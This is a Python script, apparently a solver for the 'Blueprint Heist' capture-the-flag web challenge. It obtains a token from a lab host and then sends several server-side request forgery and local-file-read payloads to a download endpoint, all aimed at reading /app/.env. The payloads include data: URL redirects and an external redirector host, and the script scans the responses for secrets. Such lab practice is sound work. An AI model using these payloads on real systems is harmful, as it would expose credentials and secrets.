import re, urllib.parse, urllib.request, urllib.error, pathlib

base = "http://154.57.164.68:31206"
ev = pathlib.Path(r"D:\download\CTFTimeWriteup\HTB-TryOut\web\Blueprint Heist\solve\evidence")


def http(url, data=None, timeout=70):
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    if data:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


_, tok = http(base + "/getToken")
user = tok.decode().strip()

urls = [
    "data:text/html,<meta http-equiv=refresh content='0;url=file:///app/.env'>",
    "data:text/html,<script>document.location='file:///app/.env'</script>",
    "data:text/html,<script>window.location.replace('file:///app/.env')</script>",
    "http://httpbingo.org/redirect-to?url=file:///app/.env",
    "https://httpbingo.org/redirect-to?url=file%3A%2F%2F%2Fapp%2F.env",
]
for i, u in enumerate(urls):
    st, body = http(
        f"{base}/download?token={urllib.parse.quote(user)}",
        urllib.parse.urlencode({"url": u}).encode(),
        timeout=80,
    )
    (ev / f"dbg_lfi_{i}.bin").write_bytes(body[:8000])
    head = body[:12]
    has_secret = b"secret" in body or b"SECRET" in body or b"IM_" in body
    print(f"Q: lfi{i} status={st} magic={head!r} secret_in_body={has_secret} len={len(body)} |+")
